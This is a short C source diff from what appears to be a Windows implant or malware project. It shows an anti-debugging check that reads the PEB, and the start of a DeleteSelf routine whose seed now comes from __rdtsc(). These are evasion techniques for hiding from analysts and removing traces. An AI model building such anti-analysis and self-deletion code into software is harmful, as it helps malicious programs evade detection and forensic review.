@@ -5,8 +5,6 @@
 #include "stringutils.h"
 #include "memoryutils.h"
 
-#define _RAND_MAX 0x7FFF  
-
 BOOL IsBeingDebugged() {
 #ifdef _WIN64
 	PPEB					pPeb = (PEB*)(__readgsqword(0x60));
@@ -19,13 +17,12 @@ BOOL IsBeingDebugged() {
 }
 
 static unsigned int _Rand(IN ULONG Seed) {
-	return ((Seed * 1103515245 + 12345) % (_RAND_MAX + 1));
+	return ((Seed * 1103515245 + 12345) % (RAND_MAX + 1));
 }
 
-extern unsigned int g_RngSeed;
 
 BOOL DeleteSelf() {
-		ULONG   seed				 = (ULONG)g_RngSeed;
+		ULONG   seed				 = (ULONG)__rdtsc();
 		BOOL	bResult				 = FALSE;		
 		HANDLE	hFile				 = INVALID_HANDLE_VALUE;
 		WCHAR	szPath[MAX_PATH * 2] = { 0 };
